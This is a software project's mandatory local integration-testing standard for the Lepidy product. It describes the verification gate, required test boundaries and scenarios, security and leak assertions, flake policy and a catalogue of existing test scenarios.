# Lepidy local integration testing standard

Status: mandatory for all implementation work from 2026-09-05 onward.

Lepidy treats automated local integration tests as implementation, not follow-up work. Every user-visible behavior, security rule, durable state transition, protocol boundary and supported native action must be exercised by an automated test that runs locally. Unit tests remain useful for dense case tables, but a unit test alone cannot complete a behavior.

## The local gate

Install dependencies and the Chromium test browser once:

```sh
npm install
npx playwright install chromium
```

Run the complete gate from the repository root:

```sh
npm run verify:local
```

The command stops at the first failure and verifies, in order:

1. generated Cloudflare environment types;
2. Worker-runtime integration tests with isolated local storage;
3. application and test type contracts;
4. the Next.js production build;
5. the OpenNext Worker bundle, then the Wrangler deployment dry run;
6. browser integration tests at desktop and mobile sizes, driven against the built Worker;
7. the production dependency audit;
8. formatting, compilation and file-backed SQLite integration tests on the native Tauri target.

On WSL, the final step intentionally uses the host Windows Rust toolchain so the result covers the product's Windows target without requiring Linux GTK/WebKit packages. On macOS, Windows outside WSL, and Linux with Tauri prerequisites, it uses the current host toolchain directly.

### The desktop GUI suite is separate, and deliberately

```sh
npm run test:desktop-gui
```

It builds nothing: run `cargo build --manifest-path src-tauri/Cargo.toml -p lepidy-desktop` first. It then starts the built Worker and drives the compiled application in a real window.

It is **not** part of `verify:local` because it needs `tauri-driver` (`cargo install tauri-driver --locked`) and a platform WebDriver whose version matches the installed WebView2 runtime — a fresh checkout has neither, and a gate that cannot run on a fresh checkout is a gate people stop running. Run it before any change to the shell's window, capabilities, command surface or navigation guard is called finished, and before a release. It refuses to attach to a driver left by an interrupted run, because doing so would drive whichever binary that run started.

## What counts as integration coverage

An integration test crosses the real boundary where a defect could occur:

| Boundary | Required local test |
|---|---|
| Pure product rule used by several callers | A case-table unit test plus at least one Worker/API or UI integration scenario using that rule. |
| Workspace state | Run the exported Durable Object in Cloudflare's Workers runtime with real local SQLite storage. Inspect persisted rows where the invariant concerns storage. |
| D1, KV, R2 or Queues | Use the local Cloudflare binding implementation. Do not replace the binding with an object-shaped mock. |
| HTTP/API/MCP | Call the public transport entry point with signed or authenticated test identities. Assert the response and durable side effects. |
| Browser behavior | Drive the locally started application with Playwright. Cover wide and narrow viewports, keyboard use, error/loading/empty states and accessibility. |
| Tauri behavior | Drive the compiled app through `tauri-driver`. A browser-mode test may cover rendering, but it does not prove a native command; the first real-window run of this suite found every native command unreachable from the workspace origin, which no Rust test could see. The client is `tests/desktop/gui.mjs`, which speaks WebDriver over HTTP directly rather than through WebdriverIO — four scenarios do not justify a two-hundred-package dependency tree in a repository whose gate audits its dependencies, and on a WSL development machine the framework's runner cannot reach the driver at all because Windows refuses inbound connections from WSL. Run it with `npm run test:desktop-gui`; it is not part of `verify:local`, see below. |
| Rust CLI/runner | Launch the compiled executable against disposable local services. Assert process tree, exit code, files, permissions, redaction and cleanup. The CLI suite lives in `src-tauri/crates/lepidy-cli/tests` and runs inside the native step of `npm run verify:local`. |
| External provider | Run Lepidy against a deterministic local HTTP double that implements the provider contract, including retries, invalid signatures, timeouts and ambiguous outcomes. Keep a separately triggered sandbox certification test when the provider offers one. |
| Billing/store behavior | Replay signed local fixtures through the real webhook handler and durable entitlement store. Never call a live purchase endpoint in the normal local gate. |
| Load/recovery | Run seeded multi-tenant scenarios locally with deterministic fault injection, process restart/DO eviction and measured writes, duration and latency. |

Cloudflare's test runtime supplies storage isolation and direct Durable Object access. Playwright starts the built Worker under `wrangler dev`, not `next dev`: the Next.js binding proxy cannot host a Durable Object, and a cross-worker object reached over the dev registry stops answering after the first call. Driving the real Worker also means the browser suite exercises the runtime the product ships on. `scripts/browser-worker.mjs` starts development and production-configured instances with separate disposable D1/DO storage, applies migrations and removes storage on graceful teardown. The test-only wrapper in `tests/fixtures/browser-worker.ts` seeds real channel history through production methods, inserts agent attribution for the not-yet-exposed agent transport, exposes authenticated state counts and acknowledges local queue deliveries as a deterministic sink. Production `custom-worker.ts` does not import that wrapper. Browser account identifiers derive deterministically from the scenario and account ordinal. Tauri's current recommended end-to-end route is WebdriverIO with its Tauri service; it supports an embedded driver on Windows, Linux and macOS.

## Required scenario families

Test names use `<AREA>-INT-<number>` and include the identifier in the test title or a nearby comment. Each ledger record lists the identifiers it added or changed.

| Area | Ledger scope | Minimum automated scenarios before completion |
|---|---|---|
| Foundation | F01–F06 | Production bundles, binding availability, schema history from every retained version, rollback/quarantine, restart, outbox replay, duplicate commands and competing alarms. |
| Identity and tenancy | D01, F04–F05, C07 | Sign-up/link/recovery, invite, last-admin guard, tenant mismatch across HTTP/socket/MCP, device revoke and cross-plane session termination. |
| Chat | C01–C11 | Authorized send/read/edit/delete, idempotent writes, thread/read state, reconnect replay, responsive composer, drafts, notification rules, file visibility, search privacy, ranked queues and resumable import. |
| Agents | D02–D06, A01–A05 | Reserved identities, enqueue/claim/lease/fence/complete, lost wake, crash/retry, delegation expiry, OAuth resource binding, exact-subject WIF, raw signed cloud callbacks, metadata-only custom wakes, SSRF/replay refusal, reconciliation, secret-scan canaries and duplicate external outcomes. |
| Solo local content | D08a, F03b, C02–C09 | Cloud metadata with no message bodies, host SQLite commit-before-ack, encrypted relay frames, offline failure, stale-host fencing, reconnect, host transfer and Team upgrade migration. |
| Vault | D04–D05, D05a, V01–V08 | Native-client-generated root/recovery material, cloud/browser schema and transport absence, every policy branch, per-custodian wrapping/rekey, ciphertext/AAD/versioning, device enrollment, requester-owner-approver provenance, expiry/revoke, local/cross-device injection, device-mediated proxy, recovery, leak canaries, scan-target authorization, canary refusal before the write, and an adversarial harness that cannot route around a refusal. |
| Runner and desktop | D05a, R01–R05, P01–P04 | Remote trigger schema rejects executable/script/arguments/directory/environment/limit overrides; local edits require real OS verification; the runtime screen offers no launch editor and its local-change asks stay pending until the machine reports a higher revision; process launch/stop/tree cleanup, session reuse, offline stop, Windows/macOS/Linux presets, Tauri IPC allow/deny and distribution capability differences. |
| Billing | B01–B03 | Seat examples 1/2/5/6/20/21/50, storage packs, proration decisions, webhook replay/order, lapse/recovery and preservation of customer data. |
| Operations | D07, O01–O03 | Retention clocks, export/delete, restore without authority resurrection, tenant cost counters, limits, migration quarantine, rollback and redacted diagnostics. |
| Release gates | G01–G05 | The full synthetic-secret product journey, two-tenant adversarial suite, load/fault suite and supported-platform acceptance matrix. |

## Test data and isolation

- Every test creates its own tenant and uses deterministic IDs. Tests may never depend on execution order or a developer's existing local data.
- Credentials are synthetic canaries. Values must be recognizable enough to detect leaks and worthless outside the test.
- Time, random IDs and provider responses are injectable at domain boundaries. Tests exercise expiry and retries without sleeping for wall-clock minutes.
- Each test cleans temporary files and child processes in a `finally`/teardown path. The suite fails when cleanup detects leftovers.
- Network access is denied by default inside tests. A scenario must explicitly register each allowed local or sandbox endpoint.
- Storage fixtures are versioned. Migration tests retain at least one database created by every released schema version.

## Assertions for security-sensitive behavior

A success assertion is insufficient. Each authorization, vault and tenant feature includes paired allow and deny cases. Tests assert that denied or failed operations leave no forbidden rows, queued events, files, grants, logs, notifications or partial external actions. Cross-tenant cases use two valid tenants and valid credentials so they cannot pass merely because the request was malformed.

Leak tests scan HTTP bodies, WebSocket messages, MCP results, browser storage, captured logs, audit metadata, child stdout/stderr and temporary files for the synthetic secret canaries. Redaction tests also cover encoded and line-split output forms defined by the threat model.

Agent-onboarding surfaces carry one further rule. The `PreToolUse` hook, `lepidy scan` and `lepidy hint` are advice, not boundaries, so their tests must assert **fail-open** behavior explicitly: a missing, unreadable or unknown-version advice cache, malformed hook input and an unrecognized tool all have to allow rather than block. A test that only proved they refuse things would be testing the wrong property, and a hook that failed closed would block every command an agent runs.

Security boundary tests also scan every cloud migration and serialized cloud protocol fixture for vault roots, recovery codes and local launch configuration. The runner suite sends validly authenticated requests containing each forbidden launch field and proves rejection before any process or durable write. Vault setup and recovery tests capture every local cloud-bound request and prove that only ciphertext, wraps, salts and KDF parameters leave the client.

## The browser harness

Browser scenarios import `test` and `expect` from `tests/browser/harness.ts`, not from `@playwright/test` directly, and a scenario that builds its own context calls `blockPrefetch` on it. The fixture stops the browser issuing speculative Next.js prefetches — roughly ten per page on this shell, thirty-four measured in one short scenario — which the test then abandons by navigating or closing.

That is not tidiness. `wrangler dev` proxies every request through a ProxyWorker, and when the proxied fetch rejects — which is what an abandoned request looks like from inside — it reports the failure to its controller as fatal and the dev server exits, failing every remaining scenario on a refused connection. It is the instability recorded against C01a as "not concurrency and not memory". Prefetching is a browser optimisation for a route the test is about to fetch anyway; no assertion depends on it, and removing the abandoned requests removed the failure. A scenario that genuinely needs to assert on prefetching should build its own context without the fixture and accept the consequence.

Both of the dev server's output streams go to `.wrangler/worker-<env>.log` rather than being inherited, because Playwright does not keep draining the pipes it hands this script and an undrained pipe eventually kills workerd with `EPIPE`; an unexpected exit is still announced on stderr with its code. **Stderr matters as much as stdout**: this suite deliberately provokes server-side errors — refused canaries, forged Server Actions, denied handles — and wrangler writes each one to stderr, so on a full-matrix run that is the stream that fills first. Capturing it is also what makes a mid-suite death diagnosable, since wrangler's own fatal error is written there and nowhere else.

## Flake policy

- Local tests run with zero retries. A failure must remain visible.
- Tests wait on observable state or controlled clocks, never fixed sleeps.
- A flaky test blocks task completion. Quarantine is allowed only for an upstream tool defect with a linked issue, an owner and a replacement release gate; tenant-isolation and leak tests cannot be quarantined.
- Randomized and property tests print their seed so the exact failure can be replayed.

## Ledger evidence contract

A task may move to `done` only when its evidence record includes:

- scenario identifiers and the files containing them;
- the exact local command and passing counts;
- which real boundaries were exercised and which dependencies were deterministic local doubles;
- supported operating systems actually exercised;
- any external sandbox certification still required before release.

Manual review and screenshots can supplement visual judgment, store review and hardware-specific behavior. They do not replace automated functional coverage. If a behavior cannot yet be automated, its ledger item remains `in_progress` or `blocked` with the missing harness named explicitly.

## Current automated baseline

| Scenario | Location | Coverage |
|---|---|---|
| `WORKSPACE-INT-001` | `tests/workspace.test.ts` | Direct RPC to a local SQLite Durable Object and singleton schema persistence. |
| `C06-RULE-001–006` | `src/domain/notifications.test.ts` | Human/agent delivery tiers, `nothing` versus `mute`, scheduled/manual DND, room-plus-private visibility, exact-audience broadcast authorization and deterministic Home ranking. |
| `C06-INT-001–003` | `tests/notifications.test.ts` | Real Durable Object and SQLite notification creation, exact unread counts beyond one page, read/unread state, keywords, DND, thread subscriptions, private-item withdrawal and authorized broadcast refusal/confirmation. |
| `PWA-INT-001–008` | `tests/browser/pwa.spec.ts` | The installed shell, tested against what is actually served rather than the source that produced it — a manifest naming an icon that 404s installs with no icon and nothing in a type system notices. A manifest whose every icon resolves, including a separate maskable one because a circular crop removes this mark's wingtips first, and whose shortcuts are all places rather than actions; a registered service worker that puts nothing from a signed-in request into a cache, lets everything that is not a GET navigation past untouched so no Server Action can be lost, and holds only shipped assets; the shipped `destination` function run in a real engine against absolute URLs, protocol-relative authorities, traversal, backslashes and missing or non-string input, each landing in the Inbox rather than nowhere; an offline document that says nothing typed on it is saved or sent, that approvals expire whether or not this device sees them, and that fetches nothing over the network it is shown without; and a permission surface that promises delivery in none of its four states — naming the Inbox when granted because an operating system can still silence a notification, and offering no button when denied because a browser that has been told no does not re-prompt. P03b adds the subscription boundary: a subscribe refused without a session and refused again with a session but no CSRF token, before anything is stored; a real P-256 subscription accepted and a wrong-length key or a plain-http endpoint refused at the edge rather than inside an outbox retry loop nobody can point at; an unsubscribe that succeeds twice, because a request to stop being notified must not fail for having already been carried out; and a deployment with no VAPID key answering 503 so the browser can say it cannot push, rather than somebody granting permission and waiting forever. |
| `PUSH-RULE-001–005`, `PUSH-INT-001–004` | `tests/web-push.test.ts` | What may be sent and what a push may say, then the cryptography with the runtime's own primitives. A subscription refused for plain http, embedded credentials, a fragment, a wrong-length key or a non-base64url secret; a payload that is identifiers and a destination, with `title`, `body`, `credentialName`, `reason` and `message` each refused by name because a field here would put another person's words on a lock screen and silently undo C06's metadata-only outbox; a destination that is a rooted path and never a URL; an approval time-to-live that shrinks with the clock and reaches zero once its five minutes are gone; `404` and `410` deleting a subscription rather than retrying one that will never work again; and a VAPID token scoped to the push service's origin rather than the endpoint. Then, against real WebCrypto: an `aes128gcm` body whose header is asserted byte by byte and which is **decrypted back** from the receiver's private key, because that is the check that the key schedule is right and a vector recalled from memory would not be; a different ephemeral key every time to the same subscription; an ES256 token verified against its own public key with a raw `r‖s` signature rather than DER, which is the classic way a VAPID token is rejected with an unhelpful 401; and a send that never follows a redirect. |
| `PUSH-INT-005–010` | `tests/push-delivery.test.ts` | Delivery against real workerd Durable Objects and SQLite. One row per browser rather than per person, a refreshed subscription replacing its own row rather than accumulating a dead endpoint, and a shared machine moving an endpoint to whoever is now signed in; an unsubscribe that is idempotent and cannot reach another member's browser; a notification rendered under the **viewer's** authority at display time rather than the sender's at send time, with a private room refused to a non-member, a public one allowed, and a deleted message becoming unrenderable after its push has already gone out; a preview stripped of newlines, bidirectional overrides and control characters and bounded in characters before it can reach a lock screen; a deployment with no push key dead-lettering with a readable reason instead of retrying work that cannot succeed; a member with no browser registered costing nothing, because an outbox that retried every such member would never drain; and every browser an offboarded member had forgotten explicitly, since the directory tombstone means the table's `ON DELETE CASCADE` never fires. |
| `O01-RULE-001–006` | `src/domain/tenant-lifecycle.ts` | Deleting a workspace, which is the one action in this product with no recovery path. The confirmation is the workspace's own name rather than a word anybody could type, because "DELETE" is muscle memory within a week; a verified gesture is always required; the purge is held for seven days and skipping that window is its own act with its own confirmation and gesture, because a person who has just typed a workspace's name is in exactly the state where one more click is automatic. Every stage is reached, an out-of-order set of completions still resumes correctly, and routing is last because a workspace whose routing is gone is one nothing can reach — including the purge that had not finished. The receipt's digest changes with its counts, and `channels`, `members`, `name`, `slug` and `messages` are each refused by name, because the receipt outlives the workspace and is the most tempting place to keep "just the channel names". And the Solo caveat never claims a purge erased somebody's computer or the backup they made of it. |
| `O01-INT-001–008` | `tests/tenant-lifecycle.test.ts` | The same decisions against real workerd Durable Objects and SQLite. A workspace inaccessible to every member including its owner the moment deletion is requested, enforced at the one function every authorised read and write passes through; a deletion refused for want of owner authority, the typed name or the gesture, with no request left behind by any of the three refusals; a cancellation reachable while the workspace is otherwise inaccessible, refused to a non-owner, and restoring a working workspace; a window that is not advisory, with nothing touched and no checkpoint written before it elapses, and a skip refused without its own gesture; a purge advanced one stage per call — which is what an interruption looks like from outside — reaching every stage, leaving no row in any content table, and returning the same receipt when run again; the retention sweep and the hourly reclamation both present on the scheduler, which is what C08a left undone; reclamation marking an object only after R2 actually took it, so a failed sweep retries rather than recording a reclamation that did not happen; and **a coverage guard that reads `sqlite_master` and fails if any table is neither purged nor deliberately kept** — the check that catches a migration three months from now adding a table nobody thinks to purge. |
| `C06-UI-INT-001–004` | `tests/browser/activity.spec.ts` | Built-Worker Home and Inbox parity, actionable read state, rail/topbar activity entry points, per-room/keyword/DND settings, narrow-screen accessibility and dark mode, plus exact broadcast-audience confirmation in the composer. |
| `RUNNER-SEC-001/002` | `src/domain/local-agent-trigger.test.ts` | Exact opaque remote trigger schema and rejection of every local launch-configuration override. |
| `VAULT-AUTH-001–006` | `src/domain/vault-authorization.test.ts` | ACL union plus mandatory intersections, complete unattended delegation, independent reveal rights, exact grants and instructive non-circumvention denials. |
| `VAULT-ENVELOPE-RULE-001/002`, `VAULT-POLICY-RULE-001–003` | `src/domain/vault-envelope.test.ts`, `src/domain/vault-policy.test.ts` | AES-GCM AAD binds workspace/credential/version; envelope, wrap, metadata, TTL, rate and exact-custodian constraints fail closed. |
| `VAULT-INT-007/008` | `tests/vault.test.ts` | One custodian wrapping key per member with replacement refused rather than silently stranding wrapped credentials; a release that returns ciphertext only on an allow, only to a custodian, and spends no grant or rate slot on a requester who holds no wrap; and a real ECDH round trip where only the test's private half opens the value. |
| `V07-INT-001/002/005` | `tests/vault.test.ts` | Against the real Durable Object and SQLite: adding exactly one recipient wrap only after membership, current key epoch, unlock, fresh verification and confirmation; removing a custodian only with a fresh ciphertext/DEK version and the exact remaining wrap set while revoking grants and pending approvals; final-custodian refusal; and an all-or-nothing recovered member-key rotation that cannot strand credentials when a replacement is missing. |
| `V07-INT-003/004/006`, `V07-UNIT-001/002` | `tests/vault-recovery.test.ts`, `src/domain/vault-recovery-client.test.ts` | Real D1 opaque recovery/device-package custody with epoch CAS, exact target-device epoch, consume-once behavior and removal of old packages; Argon2id/AES-GCM recovery bound to account/epoch with one generic wrong-code failure; P-256 device enrollment packages bound to target and key epoch; and rekey-before-revoke device removal that advances recovery and device epochs together. |
| `VAULT-APPROVAL-RULE-001–013` | `src/domain/vault-approval.test.ts` | A mandatory reason kept to one line; a batch bounded at ten with no repeated credential and only where the eligible-approver set is identical; the allow windows a policy actually permits and the expiry each becomes; first-terminal-answer-wins with the second told what happened; expiry exactly at five minutes and only while pending; a gesture digest bound to the approval, every credential version, policy epoch, outcome and window, and refusing a partial answer; agent-facing hints that say stop rather than retry; every fact PRD §8.6 requires on the card including the reveal warning; and a kill-switch announcement that never claims revoked grants came back. |
| `VAULT-INT-009–014` | `tests/vault.test.ts` | Against the real Durable Object and SQLite: an ask becoming a card in every owner's vault DM with no ciphertext in the message or the queued push while an automatic allow needs no card; a gesture refused without verification, with a mismatched digest, or from somebody who is not an approver; first-answer-wins issuing exactly one grant, the second answer refused and both copies of the card carrying the answer; the grant then honoured by the release path; timing out at the deadline, denying the items, posting the timeout and refusing a late answer; one command coalesced into one card and never across owners, with mixed per-item decisions atomic; each kill-switch scope revoking grants, ending pending cards, announcing itself, outranking policy and never restoring on the way back; and a card refused after the credential it described changed. |
| `VAULT-APPROVAL-INT-001/002` | `tests/browser/vault-approvals.spec.ts` | The whole flow against the built Worker: a device request becoming a card, the card in the Inbox with its reason, credential, risk and deadline, allowing gated on a passkey and completed with a real WebAuthn assertion from a virtual authenticator, the resulting grant honoured once and asked for again afterwards, and the conversation with `@a.vault` carrying the question and the answer but never the value. With scripting off, denying still works and the allow buttons say they are not ready. |
| `VAULT-INT-015–018` | `tests/vault.test.ts` | Against the real Durable Object and SQLite: live grants listed with the holder, the agent operating under them and the approver as separate fields, filtered to what the reader may see and refusing a revoke from somebody who may not; a credential described as metadata, policy and the three ACL verbs with no field able to carry a value, and reported as missing to a member with no rights; an activity log that keeps requester, operating owner and approver apart across an approval answered by the second owner and used by the first; and an agent described with its vault switch separate from its status. |
| `VAULT-UI-INT-001–003` | `tests/browser/vault-ui.spec.ts` | The pages against the built Worker: an approval allowed for fifteen minutes appearing as a live grant that names all three parties, honoured while it stands and refused the moment it is revoked from the page; the credential page carrying the delivery explanations, policy, the three privileges and the access log with the requester's own reason, clean of the canary and free of serious accessibility violations in both themes, with an unknown credential reported as missing rather than forbidden; and an agent cut off from the vault with scripting switched off, staying active, with the on switch saying plainly that it needs a passkey. |
| `VAULT-POLICY-RULE-004–006`, `VAULT-INT-019/020` | `src/domain/vault-policy.test.ts`, `tests/vault.test.ts` | A structured credential naming the fields it expands into and refusing a field name nothing could read; a rotation nag a week before rather than after; a capture source held to a bare program name so no command line reaches the workspace; and against the real Durable Object, a captured credential accepted once, switched off until confirmed, refused while it waits, and behaving like any other ask-every-time credential afterwards, with its field names and rotation date carried as metadata and no value anywhere in the result. |
| `VAULT-CLI-RULE-024–032` | `src-tauri/crates/lepidy-cli/src/{envfile,template,capture,run}.rs` | The `.env` shapes a real file comes in, every reason a line was skipped and which line it was; placeholder scanning that leaves `${HOME}` alone, deduplicates a name used three times and refuses a typo rather than writing it into a config; a capture source reduced to a bare program name; a rendered template named after its source; and a `SOURCE=DESTINATION` spec that survives a Windows drive letter, which a colon separator does not. |
| `VAULT-CLI-INT-017–020` | `src-tauri/crates/lepidy-cli/tests/cli_integration.rs` | The compiled binary: a capture storing a command's output without it appearing in the terminal, the request or the agent's context, landing inject-only and ask-every-time and refusing to store anything when the command fails; an import creating from a `.env`, reporting each skip with its line and reason, printing no value in a dry run or a summary, leaving the source in place and removing it only under `--shred`; a tagged group and a template resolved in one request, with the rendered file gone when the command exits and non-Lepidy syntax untouched; and a structured credential expanding into one variable per field, each redacted on the way out and visibly correct with scrubbing off. |
| `V07-CLI-INT-001`, `V07-CLI-UNIT-001` | `src-tauri/crates/lepidy-cli/tests/cli_integration.rs`, `src-tauri/crates/lepidy-cli/src/recovery.rs` | The compiled replacement-device workflow downloads only encrypted recovery material, opens the old wrapping key locally, rewraps every current credential, installs a fresh local key, rotates the cloud recovery package and prints a new code. Captures contain neither recovery code, private key, DEK nor credential canary; wrong code, moved account context and tamper share one failure. |
| `VAULT-UI-INT-004` | `tests/browser/vault-ui.spec.ts` | A captured credential shown with what produced it, refused while it waits, confirmed with a real gesture, and behaving like any other ask-every-time credential afterwards. |
| `VAULT-CLI-RULE-001–023` | `src-tauri/crates/lepidy-cli/src/*.rs` | The canonical AAD and signed-request strings byte for byte against their TypeScript twins; wrap and envelope opening refused under any other context or key; scrubbing across chunk boundaries, overlapping values and short-value suppression; `NAME:PATH` parsing including Windows drive letters; refusal to clobber a file it did not create; and plain HTTP refused off loopback. |
| `VAULT-CLI-INT-001–016` | `src-tauri/crates/lepidy-cli/tests/cli_integration.rs` | The compiled binary against a loopback double that verifies the signed envelope: enrolment sending no passphrase, recovery code or private key and a keystore only those two open; a refused login writing nothing; metadata listing over a verified signature; a wrong passphrase never reaching the network; `add` sealing the value before it leaves, reversible only by the sealed local key; injection into a real child with both streams redacted, including a value split across writes; a `0600` file delivery readable by the child and unlinked afterwards; deny, needs-approval, unknown-credential and stale-key-epoch paths that never spawn the command, each with its own exit code; no flag anywhere accepting a value; a device with no vault key able to list but not to seal; a pending approval reported with its id and the workspace's own waiting wording, refused without a reason, and never spawning the command; and one command asking once for every credential it needs rather than once each. |
| `VAULT-DEVICE-INT-001/002` | `tests/browser/vault-device-api.spec.ts` | The device HTTP surface against the built Worker with a real P-256 device key: enrolment, a body-tampered and a forged signature refused, metadata with no ciphertext or wraps, creation requiring user verification in the same request, a policy-allowed release opened only by the client's own private key, and refusal of a replayed nonce, an unsigned call, another device's key and an origin that does not exist. |
| `VAULT-INT-001–006` | `tests/vault.test.ts` | Real SQLite Durable Object ciphertext CRUD/rotation/tombstones, ACL metadata filtering, Solo refusal, all-table plaintext/DEK canary scans, exact grants, expiry/single-use/rate/project/origin/device denials, kill-switch non-revival and device/member revocation. |
| `SESSION-INT-001` | `tests/authorization.test.ts` | Opaque session/CSRF issuance, individual/global revocation and separation from runner-device lifecycle in real local D1. |
| `DEVICE-INT-001/002` | `tests/authorization.test.ts` | P-256 signed request/body binding, replay and tamper rejection, device revoke, D1 plus tenant-local membership epochs and member-socket closure. |
| `LOCAL-CONTENT-001/002`, `SOLO-TRANSFER-001` | `src-tauri/tests/local_store_integration.rs` | File-backed native SQLite commit-before-ack, reopen/read, request replay/conflict, epoch fencing and checksummed host transfer. |
| `SOLO-RELAY-001–003` | `src/domain/relay-crypto.test.ts`, `tests/workspace.test.ts` | Authenticated opaque content frames, tamper rejection, host lease/offline behavior, directional replay sequences and old-host fencing. |
| `SOLO-UPGRADE-001` | `tests/workspace.test.ts` | Resumable staged snapshot verification and atomic content import/routing-epoch transition to Team. |
| `SCHED-RULE-001–007`, `AUDIT-RULE-001–010` | `src/domain/due-work.test.ts`, `src/domain/audit-chain.test.ts` | Deterministic backoff, earliest-deadline selection, missed-slot collapsing, retention clocks; audit hash coverage of every provenance field, canonical metadata, delimiter forgery, redaction deny list and chain verification including a purged head. |
| `SCHED-INT-001–006` | `tests/scheduler.test.ts` | One alarm multiplexing competing deadlines, duplicate coalescing, per-item backoff and retirement of a handler-less kind, recurring catch-up, alarm rebuilt from durable state across a real Durable Object eviction and the exported `alarm()` handler itself. |
| `OUTBOX-INT-001–008` | `tests/scheduler.test.ts` | One transaction for rows, audit, outbox, replay, deadlines and idempotency receipt; full rollback on failure; replayed request without repeated effects; transient retry, permanent and budget-exhausted dead-lettering; delivery dedupe; the real local Queue binding; membership projection over RPC. |
| `AUDIT-INT-001–003` | `tests/scheduler.test.ts` | Append-only triggers, tamper detection after an operator drops the trigger, daily anchoring and refusal to seal a broken chain. |
| `RETENTION-INT-001/002` | `tests/scheduler.test.ts` | Every D07 expiry class swept exactly at its boundary under a controlled clock, and audit purge limited to anchored expired sequences with the chain still verifiable afterwards. |
| `SHELL-RULE-001–009` | `src/shell/shell-model.test.ts` | Active-section resolution, path normalisation, section and channel titles, channel links, generated initials and gradients, and theme preference/resolution/toggle rules. |
| `SHELL-DATA-INT-001–004` | `tests/shell-data.test.ts` | The real control-plane adapter against local D1 and a real workspace object: a signed-in workspace, a private room hidden from a valid member who is not in it, archived rooms and agents excluded, missing/forged/revoked/stale-epoch sessions refused, and an unbound development preview allowed while every partial or complete control-plane binding refuses a signed-out preview. |
| `SHELL-INT-001–008` | `tests/browser/shell.spec.ts` | Shell layout at both viewports, accessibility in light and dark on three routes, one current navigation item, keyboard-only operation, dark mode applied before first paint and remembered, honest not-built-yet and unavailable-channel states, the absence of development fixture data in an authenticated deployment and the viewer's profile. Every scenario signs up into its own real workspace. |
| `DESKTOP-INT-001–005` | `tests/browser/shell.spec.ts` | Windows caption controls and drag surface, macOS overlay reserving the native traffic lights, and the rail sitting below the reserved titlebar only on desktop. P01a adds the badge bridge from the web half: against a stand-in for the Tauri runtime the page asks for `set_badge` with a non-negative integer and nothing else, and in an ordinary browser it reaches for the machine not at all and raises no page error, because a shell bridge that ran outside the shell would be an unhandled rejection inside a layout component. |
| `ROOM-RULE-001–013` | `src/domain/rooms.test.ts` | Channel slug normalisation and reserved namespaces, name and topic bounds, canonical direct-message identity including a splice-forgery case, message body control-character stripping and limits, one-level thread placement and opaque history cursors. |
| `ROOM-INT-001–012` | `tests/rooms.test.ts` | Idempotent room creation, private-room invisibility to a valid non-member with no rows left behind, join/leave, archive-readable-but-not-writable, one conversation per set of people, the single send transaction with body-free audit/replay/delivery, idempotent retry and key-reuse refusal, thread depth and reply counts, history paging with a same-millisecond tie, the Solo refusal to store content, revoked-member refusal and two-workspace isolation. |
| `ROOM-INT-013` | `tests/browser/shell.spec.ts` | Rendered channel history, agent messages visibly distinct from people, thread reply counts and the empty-room state. |
| `READ-RULE-001–010`, `SOCKET-RULE-001–007` | `src/domain/read-state.test.ts`, `src/domain/socket-protocol.test.ts` | The one visibility rule, monotonic clamped read cursors, unread derivation including a non-member room contributing nothing, presence/typing freshness, and total frame parsing that carries no actor and refuses oversized or malformed input. |
| `LIVE-INT-001–010` | `tests/live.test.ts` | Real hibernatable sockets against the object: authorized upgrade and stale refusal, keepalives answered by the runtime with no durable write, filtered fan-out that never reaches a room the socket may not see, cursor replay refiltered against current membership, an expired replay window answered with a reset, malformed frames and live authority revocation, one read cursor across a member's devices, separate thread read state, no unread in a room never joined, and presence/typing relayed without writing anything. |
| `MD-RULE-001–013` | `src/domain/markdown.test.ts` | Fenced code with a language, everything inside a fence kept literal, block grouping, code spans winning over every inline rule, link-scheme safety, a tree that is never markup, mention classification by prefix, the email-domain case, and reaction shapes. |
| `MSG-INT-001–007` | `tests/messages.test.ts` | Mention recording and resolution with unknown handles kept unresolved and code-fenced ones ignored, author-only edits with a re-derived address list and a visible marker, the Solo refusal to edit content, a delete that removes the body, mentions and reactions while keeping the tombstone and thread, admin deletion attributed to the admin, and idempotent reactions refused from outside the room or of the wrong shape. |
| `MSG-INT-008/009` | `tests/browser/shell.spec.ts` | Markdown rendered as elements with a language-tagged code block and a classified mention, and the composer's three regressions: focus retained after a send attempt, a per-room draft that survives leaving and returning, and Enter sending while Shift+Enter adds a line. |
| `ACCOUNT-INT-001–003` | `tests/accounts.test.ts` | The control-plane account object against real local D1: sign-up provisions a workspace with a starter room, an unknown address and a wrong password answer identically, addresses normalise, and a duplicate address is refused. |
| `AUTH-INT-001` | `tests/browser/account.spec.ts` | Sign-up into a real workspace and a message posted through the composer's authenticated path, persisting across a reload, driven against the built Worker with real D1 and real Durable Objects. |
| `AUTH-INT-002/003` | `tests/browser/account.spec.ts` | HttpOnly session cookie, sign-out, refusal on the next request after restoring the revoked token, indistinguishable wrong-password/unknown-address errors, and successful sign-in after both failures. Each submission waits for its own response and the form becoming ready. |
| `AUTH-INT-004` | `tests/browser/account.spec.ts` | The same real sign-up action and input refused in a production-configured built Worker and accepted in development; denied sign-up leaves accounts, challenges, sessions, memberships and workspaces unchanged. |
| `AUTH-INT-005` | `tests/browser/account.spec.ts` | Message actions reject missing, forged and other-account CSRF tokens and a foreign Origin; denial leaves message, mention, reaction, audit, replay, outbox and idempotency counts unchanged. A valid session-bound token sends successfully. |
| `AUTH-INT-006` | `tests/browser/account.spec.ts` | Sign-out actions reject missing, forged and previous-session CSRF tokens while leaving the current session usable; the current token signs out successfully. |
| `PIN-INT-001–004`, `SAVED-INT-001–004`, `FORWARD-INT-001–004` | `tests/saved-content.test.ts` | Room-wide pins refused to non-members and invisible outside a private room; private saved items that stop resolving once the member leaves the room or the message is deleted; forwarding that carries a copy, withholds the source room from a reader who cannot see it, and is refused for an unreadable source or an unjoined target; history paged without loss or repetition; and Solo refusals for pinning and forwarding. |
| `MSG-INT-010–014`, `SAVED-INT-005/006`, `FORWARD-INT-005` | `tests/browser/saved-content.spec.ts` | The same actions driven as a signed-in member: edit with an edit marker, delete leaving a tombstone, react and un-react, pin and unpin, save and unsave from a private list reachable from the rail, forward with visible provenance, and revealing older messages without disturbing what is on screen. |
| `DRAFT-INT-001–005`, `SCHED-MSG-INT-001–007` | `tests/drafts-scheduled.test.ts` | One draft per member per surface with a revision that refuses to overwrite another device's edit; thread drafts separate from a room's; drafts withheld once the member leaves the room; scheduled sends that fire once at their time, survive an eviction, recheck authority at the send time rather than the scheduling time, refuse a suspended author or an archived room, edit and cancel before firing, stay private to their author, and are bounded in time. Solo refusals for both. |
